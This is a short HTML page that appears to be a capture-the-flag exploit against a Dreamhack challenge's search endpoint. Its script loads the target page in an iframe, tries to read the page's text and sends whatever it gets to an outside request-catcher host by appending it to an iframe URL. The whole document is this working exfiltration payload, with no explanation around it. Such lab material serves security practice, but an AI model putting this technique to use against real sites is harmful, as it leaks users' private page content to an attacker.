
<html>
    <head>
        <script>
            const afterLoad = function() {
                  const iframe = document.createElement("iframe")
                  let text = "";
                  try {
                      text = document.getElementById("query").contentWindow.document.getElementsByTagName("pre")[0].textContent 
                  } catch (error) {
                      text = "NoNo"
                  }
                  iframe.src = `https://mbfjcpx.request.dreamhack.games/` + text
                  document.body.append(iframe)
              }
          </script>
    </head> 
      <body>
    
          <iframe src="http://host8.dreamhack.games:9098/search?query=D" id="query" onerror="afterLoad()" onload="afterLoad()"></iframe>
      </body>
</html>
